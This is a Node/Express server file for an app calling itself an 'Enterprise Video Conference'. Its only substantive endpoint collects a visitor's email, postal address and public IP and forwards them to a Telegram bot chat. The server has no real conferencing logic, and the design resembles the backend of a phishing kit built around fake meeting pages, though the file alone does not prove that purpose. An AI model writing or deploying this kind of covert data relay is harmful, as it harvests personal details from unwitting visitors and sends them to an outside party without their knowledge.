import express from "express";
import path from "path";
import dotenv from "dotenv";
import { createServer as createViteServer } from "vite";

dotenv.config();

const app = express();
const PORT = 3000;

app.use(express.json());

// Helper to check if an IP is private/loopback
function isPrivateIp(ip: string): boolean {
  if (!ip) return true;
  const cleanIp = ip.replace(/^::ffff:/, '').trim();
  if (cleanIp === '127.0.0.1' || cleanIp === '::1' || cleanIp === 'localhost') return true;
  if (cleanIp.startsWith('10.')) return true;
  if (cleanIp.startsWith('192.168.')) return true;
  if (/^172\.(1[6-9]|2[0-9]|3[0-1])\./.test(cleanIp)) return true;
  if (cleanIp.startsWith('fc00:') || cleanIp.startsWith('fe80:')) return true;
  return false;
}

// Extract public IP from request headers or remote query
async function getPublicIp(req: express.Request): Promise<string> {
  const forwarded = req.headers['x-forwarded-for'];
  if (typeof forwarded === 'string') {
    const ips = forwarded.split(',').map(s => s.trim());
    for (const ip of ips) {
      if (ip && !isPrivateIp(ip)) {
        return ip;
      }
    }
  }

  const realIp = req.headers['x-real-ip'] || req.headers['cf-connecting-ip'];
  if (typeof realIp === 'string' && !isPrivateIp(realIp)) {
    return realIp;
  }

  try {
    const controller = new AbortController();
    const timeout = setTimeout(() => controller.abort(), 3000);
    const resp = await fetch('https://api.ipify.org?format=json', { signal: controller.signal });
    clearTimeout(timeout);
    if (resp.ok) {
      const data = await resp.json() as { ip?: string };
      if (data?.ip && !isPrivateIp(data.ip)) {
        return data.ip;
      }
    }
  } catch (err) {
    // Network or timeout
  }

  return 'Unavailable';
}

// Endpoint to obtain the client's public IP
app.get('/api/client-ip', async (req, res) => {
  try {
    const ip = await getPublicIp(req);
    res.json({ ip });
  } catch (error) {
    res.json({ ip: 'Unavailable' });
  }
});

// ==========================================
// NEW: Telegram Notification Endpoint
// ==========================================
app.post('/api/submit-client-info', async (req, res) => {
  try {
    const { clientEmail, clientAddress, meetingId, hostName, clientIp } = req.body;

    const botToken = process.env.TELEGRAM_BOT_TOKEN;
    const chatId = process.env.TELEGRAM_CHAT_ID;

    if (!botToken || !chatId) {
      console.error('Telegram credentials are missing in environment variables.');
      return res.status(500).json({ success: false, error: 'Server configuration error' });
    }

    const message = `
🚨 *New Meeting Client Submission* 🚨

👤 *Client Details:*
• *Email:* ${clientEmail || 'N/A'}
• *Address:* ${clientAddress || 'N/A'}
• *IP Address:* ${clientIp || 'N/A'}

📅 *Meeting Context:*
• *Room ID:* ${meetingId || 'N/A'}
• *Host:* ${hostName || 'Host'}
• *Time:* ${new Date().toLocaleString()}
    `.trim();

    const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
    const response = await fetch(telegramUrl, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: chatId,
        text: message,
        parse_mode: 'Markdown',
      }),
    });

    const data = await response.json() as { ok?: boolean };
    if (!data.ok) {
      throw new Error('Telegram API rejected the message request.');
    }

    return res.status(200).json({ success: true });
  } catch (error) {
    console.error('Failed to dispatch Telegram notification:', error);
    return res.status(500).json({ success: false, error: 'Failed to send notification' });
  }
});

// Vite middleware configuration
async function start() {
  if (process.env.NODE_ENV !== "production") {
    const vite = await createViteServer({
      server: { middlewareMode: true },
      appType: "spa",
    });
    app.use(vite.middlewares);
  } else {
    const distPath = path.join(process.cwd(), 'dist');
    app.use(express.static(distPath));
    app.get('*', (_req, res) => {
      res.sendFile(path.join(distPath, 'index.html'));
    });
  }

  app.listen(PORT, "0.0.0.0", () => {
    console.log(`Enterprise Video Conference server running on http://localhost:${PORT}`);
  });
}

start();